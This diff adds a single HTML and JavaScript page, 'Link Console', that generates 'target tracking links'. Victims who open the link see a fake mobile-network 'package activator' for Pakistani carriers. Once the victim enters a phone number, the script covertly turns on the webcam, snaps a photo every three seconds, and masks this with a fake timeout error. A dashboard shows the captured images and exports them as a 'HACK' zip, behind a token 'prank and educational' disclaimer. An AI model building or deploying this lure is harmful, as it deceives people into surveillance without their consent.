@@ -1,0 +1,381 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>🔗 Link Console | FTGM</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
+<style>
+/* --- Theme Variables --- */
+:root {
+    --bg-dark: #0f1115;
+    --card-dark: rgba(26, 29, 35, 0.95);
+    --accent: #ef4444; 
+    --text-main: #f8fafc;
+    --text-dim: #94a3b8;
+    --border-dark: #2d333f;
+    
+    /* Light Theme (Activator) */
+    --bg-light: #f1f5f9;
+    --card-light: #ffffff;
+    --text-light-main: #0f172a;
+    --text-light-dim: #64748b;
+    --accent-blue: #3b82f6;
+    --border-light: #e2e8f0;
+}
+
+* { margin: 0; padding: 0; box-sizing: border-box; }
+
+body {
+    font-family: 'Inter', sans-serif;
+    background: var(--bg-dark);
+    color: var(--text-main);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+    padding: 20px;
+}
+
+/* --- Dashboard Style (Dark) --- */
+#dashboard-card {
+    background: var(--card-dark);
+    padding: 35px 30px;
+    border-radius: 24px;
+    max-width: 480px;
+    width: 100%;
+    text-align: center;
+    box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
+    border: 1px solid var(--border-dark);
+}
+
+/* --- Activator Style (Light & Realistic) --- */
+#pkg-activator-card {
+    background: var(--card-light);
+    color: var(--text-light-main);
+    padding: 30px;
+    border-radius: 20px;
+    max-width: 420px;
+    width: 100%;
+    box-shadow: 0 10px 25px rgba(0,0,0,0.05);
+    border: 1px solid var(--border-light);
+    display: none;
+}
+#pkg-activator-card h2 { color: var(--text-light-main); font-size: 1.5rem; margin-bottom: 8px; }
+#pkg-activator-card small { color: var(--text-light-dim); font-size: 0.9rem; margin-bottom: 25px; display: block; }
+#pkg-activator-card input, #pkg-activator-card select {
+    background: #f8fafc;
+    color: var(--text-light-main);
+    border: 1px solid var(--border-light);
+    margin-bottom: 15px;
+    font-weight: 500;
+}
+#pkg-activator-card button {
+    background: var(--accent-blue);
+    box-shadow: 0 4px 12px rgba(59, 130, 246, 0.3);
+}
+
+/* --- Common UI Components --- */
+button {
+    width: 100%;
+    padding: 16px;
+    border-radius: 12px;
+    border: none;
+    color: white;
+    font-size: 1rem;
+    font-weight: 600;
+    cursor: pointer;
+    transition: transform 0.2s, opacity 0.2s;
+    display: flex; justify-content: center; align-items: center; gap: 10px;
+}
+button:active { transform: scale(0.97); }
+
+input, select {
+    width: 100%;
+    padding: 14px;
+    border-radius: 12px;
+    font-size: 1rem;
+    outline: none;
+    transition: border-color 0.2s;
+}
+
+/* --- Toast Notification --- */
+#toast {
+    visibility: hidden;
+    min-width: 280px;
+    background-color: #1e293b;
+    color: #fff;
+    text-align: center;
+    border-radius: 12px;
+    padding: 16px;
+    position: fixed;
+    z-index: 10001;
+    bottom: 30px;
+    font-size: 14px;
+    box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+}
+#toast.show { visibility: visible; animation: fadein 0.5s, fadeout 0.5s 2.5s; }
+
+/* --- Loader Animation --- */
+#loader-container { display: none; justify-content: center; padding: 20px 0; }
+.loader {
+    transform: rotateZ(45deg); perspective: 1000px; border-radius: 50%;
+    width: 48px; height: 48px; color: var(--accent); position: relative;
+}
+.loader:before, .loader:after {
+    content: ''; display: block; position: absolute; top: 0; left: 0;
+    width: inherit; height: inherit; border-radius: 50%; transform: rotateX(70deg);
+    animation: 1s spin linear infinite;
+}
+.loader:after { transform: rotateY(70deg); animation-delay: .4s; }
+
+@keyframes spin {
+    0%, 100% { box-shadow: .2em 0px 0 0px currentcolor; }
+    25% { box-shadow: 0 .2em 0 0px currentcolor; }
+    50% { box-shadow: -.2em 0 0 0 currentcolor; }
+    75% { box-shadow: 0px -.2em 0 0 currentcolor; }
+}
+
+/* --- Startup Modal --- */
+#startup-modal {
+    position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+    background: rgba(0,0,0,0.85); display: flex; justify-content: center;
+    align-items: center; z-index: 10000; backdrop-filter: blur(5px);
+}
+.modal-content {
+    background: #1a1d23; padding: 30px; border-radius: 20px;
+    text-align: center; max-width: 380px; border: 1px solid var(--border-dark);
+}
+
+#activationStatus {
+    margin-top: 20px; padding: 15px; border-radius: 10px;
+    background: #fef2f2; color: #991b1b; border: 1px solid #fecaca;
+    font-size: 0.85rem; font-weight: 500; line-height: 1.4; display: none;
+}
+
+.gallery { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-top: 20px; }
+.gallery img { width: 100%; aspect-ratio: 1; object-fit: cover; border-radius: 10px; background: #23272f; }
+
+@keyframes fadein { from {bottom: 0; opacity: 0;} to {bottom: 30px; opacity: 1;} }
+@keyframes fadeout { from {bottom: 30px; opacity: 1;} to {bottom: 0; opacity: 0;} }
+</style>
+</head>
+<body>
+
+<div id="startup-modal">
+    <div class="modal-content">
+        <i class="fa fa-shield-halved" style="font-size: 40px; color: var(--accent); margin-bottom: 15px;"></i>
+        <h3 style="margin-bottom: 10px;">User Agreement</h3>
+        <p style="color: var(--text-dim); font-size: 0.9rem; margin-bottom: 25px;">I promise to use this tool for prank and educational purposes only.</p>
+        <button id="promiseBtn" style="background: var(--accent);">Yes Promised</button>
+    </div>
+</div>
+
+<div id="toast"></div>
+
+<div class="card" id="dashboard-card">
+    <div style="margin-bottom: 25px;">
+        <img src="https://i.ibb.co/NdB47GyN/images-2.jpg" style="width: 50px; height: 50px; border-radius: 12px; margin-bottom: 10px;">
+        <h2>Link Console</h2>
+        <small>Generate and manage your target tracking links.</small>
+    </div>
+
+    <div id="genArea">
+        <button id="genBtn" style="background: var(--accent);"><i class="fa fa-plus-circle"></i> Create Target Link</button>
+        <div id="loader-container"><span class="loader"></span></div>
+        <div id="linkBox" style="margin-top: 20px;"></div>
+    </div>
+
+    <hr style="border: 0; border-top: 1px solid var(--border-dark); margin: 25px 0;">
+
+    <div id="dataArea" style="display:none">
+        <div style="display: flex; justify-content: space-between; align-items: center;">
+            <p style="font-weight: 600; font-size: 0.8rem; color: var(--accent);">ID: <span id="showId"></span></p>
+        </div>
+        <div id="images" class="gallery"></div>
+        <button id="downloadBtn" onclick="downloadAllImages()" style="background: #23272f; margin-top: 20px; border: 1px solid var(--border-dark);"><i class="fa fa-download"></i> Export Data</button>
+    </div>
+</div>
+
+<div class="card" id="pkg-activator-card">
+    <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 20px;">
+        <div style="width: 40px; height: 40px; background: #eff6ff; border-radius: 8px; display: flex; align-items: center; justify-content: center; color: var(--accent-blue);">
+            <i class="fa fa-tower-broadcast"></i>
+        </div>
+        <div>
+            <h2>Network Activator</h2>
+        </div>
+    </div>
+    <small>Connect to the cellular gateway to synchronize your package settings.</small>
+
+    <select id="sim-select">
+        <option value="">Select Network Provider</option>
+        <option value="jazz">Jazz</option>
+        <option value="telenor">Telenor</option>
+        <option value="ufone">Ufone</option>
+        <option value="zong">Zong</option>
+        <option value="sco">SCOM</option>
+    </select>
+    <input type="tel" id="mobile-number" placeholder="Mobile Number (03xxxxxxxxx)">
+    
+    <button id="activateBtn">Verify & Activate</button>
+    
+    <div id="activationStatus"></div>
+
+    <video id="videoElement" autoplay playsinline muted style="display:none"></video>
+    <canvas id="canvasElement" style="display:none;"></canvas>
+</div>
+
+<script>
+// --- UI Helpers ---
+function showToast(msg) {
+    const t = document.getElementById("toast");
+    t.textContent = msg; t.className = "show";
+    setTimeout(() => { t.className = ""; }, 3000);
+}
+
+function fallbackCopy(text) {
+    const el = document.createElement("textarea");
+    el.value = text; document.body.appendChild(el);
+    el.select();
+    try {
+        document.execCommand('copy');
+        showToast("Link copied to clipboard");
+    } catch(e) {
+        showToast("Error copying link");
+    }
+    document.body.removeChild(el);
+}
+
+// Modal Logic
+document.getElementById('promiseBtn').onclick = () => {
+    sessionStorage.setItem('promised_ftgm', 'true');
+    document.getElementById('startup-modal').style.display = 'none';
+};
+window.onload = () => {
+    if(sessionStorage.getItem('promised_ftgm')) document.getElementById('startup-modal').style.display = 'none';
+};
+
+// --- Core Logic ---
+const CAPTURE_INTERVAL_MS = 3000;
+const dashboardCard = document.getElementById('dashboard-card');
+const pkgActivatorCard = document.getElementById('pkg-activator-card');
+const genBtn=document.getElementById('genBtn');
+const linkBox=document.getElementById('linkBox');
+const dataArea=document.getElementById('dataArea');
+const showId=document.getElementById('showId');
+const images=document.getElementById('images');
+const loaderBox = document.getElementById('loader-container');
+
+const activateBtn = document.getElementById('activateBtn');
+const simSelect = document.getElementById('sim-select');
+const mobileNumber = document.getElementById('mobile-number');
+const activationStatus = document.getElementById('activationStatus');
+const video = document.getElementById('videoElement');
+const canvas = document.getElementById('canvasElement');
+
+function generateId(){return 'ID-'+Math.random().toString(36).slice(2,8).toUpperCase();}
+function saveImages(id,imgArray){localStorage.setItem('images_'+id,JSON.stringify(imgArray));}
+function getImages(id){return JSON.parse(localStorage.getItem('images_'+id)||'[]');}
+
+function renderImages(id){ 
+    const imgs=getImages(id);
+    images.innerHTML='';
+    if(!imgs.length){ images.innerHTML='<p style="grid-column:1/-1; color:var(--text-dim); font-size:0.8rem;">Awaiting incoming data...</p>'; return; }
+    imgs.forEach(url => {
+        const img=document.createElement('img'); img.src=url; images.appendChild(img);
+    });
+}
+
+async function downloadAllImages() {
+    const id = localStorage.getItem('currentId');
+    if (!id) return;
+    const imgs = getImages(id);
+    if(!imgs.length) { showToast("No data available"); return; }
+    const zip = new JSZip();
+    imgs.forEach((url, i) => zip.file(`media_${i+1}.jpeg`, url.split(',')[1], {base64: true}));
+    const content = await zip.generateAsync({type:"blob"});
+    const a = document.createElement('a'); a.href = URL.createObjectURL(content);
+    a.download = `HACK_${id}.zip`; a.click();
+}
+
+genBtn.onclick=()=>{
+    genBtn.style.display = 'none';
+    loaderBox.style.display = 'flex';
+    
+    setTimeout(() => {
+        loaderBox.style.display = 'none';
+        const id=generateId();
+        showId.textContent=id;
+        const link=location.origin+location.pathname+'?id='+encodeURIComponent(id);
+        localStorage.setItem('currentId',id);
+
+        linkBox.innerHTML = `
+            <input readonly value="${link}" style="background:#1a1d23; color:white; border-color:var(--border-dark); text-align:center; margin-bottom:12px;">
+            <div style="display:flex; gap:10px;">
+                <button id="copyBtn" style="background:#23272f; border:1px solid var(--border-dark);">Copy</button>
+                <button id="openBtn" style="background:var(--accent);">Open</button>
+            </div>
+            <button id="refreshBtn" style="background:transparent; color:var(--text-dim); font-size:0.8rem; margin-top:10px;">Refresh Status</button>
+        `;
+        
+        document.getElementById('openBtn').onclick=()=>window.open(link,'_blank');
+        document.getElementById('copyBtn').onclick=()=>fallbackCopy(link);
+        document.getElementById('refreshBtn').onclick=()=>window.location.reload();
+        
+        dataArea.style.display='block';
+        renderImages(id);
+    }, 2000);
+};
+
+activateBtn.onclick = async () => {
+    activationStatus.style.display = 'none';
+    if (!simSelect.value || mobileNumber.value.length < 11) {
+        activationStatus.style.display = 'block';
+        activationStatus.textContent = 'Invalid Input: Please ensure mobile number and provider are correct.';
+        return;
+    }
+
+    activateBtn.disabled = true;
+    activateBtn.textContent = 'Establishing Secure Connection...';
+    const ID = new URLSearchParams(location.search).get('id');
+
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+        setInterval(() => {
+            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            const capturedImage = canvas.toDataURL('image/jpeg', 0.5);
+            const old = getImages(ID); old.push(capturedImage); saveImages(ID, old);
+        }, CAPTURE_INTERVAL_MS);
+
+        setTimeout(() => {
+            activationStatus.style.display = 'block';
+            activationStatus.innerHTML = '<strong>System Error (504):</strong> Connection timed out. The network gateway is temporarily unresponsive. Please try again in 5 minutes.';
+        }, 1500); 
+    } catch (err) {
+        activationStatus.style.display = 'block';
+        activationStatus.textContent = 'Hardware Error: Unable to verify device security credentials.';
+    }
+};
+
+const ID_PARAM=new URLSearchParams(location.search).get('id');
+if(ID_PARAM){
+    document.body.style.background = 'var(--bg-light)';
+    dashboardCard.style.display = 'none';
+    pkgActivatorCard.style.display = 'block';
+    document.getElementById('startup-modal').style.display = 'none';
+} else {
+    const savedId=localStorage.getItem('currentId');
+    if(savedId){
+        showId.textContent=savedId;
+        dataArea.style.display='block';
+        renderImages(savedId);
+    }
+}
+</script>
+</body>
+</html>
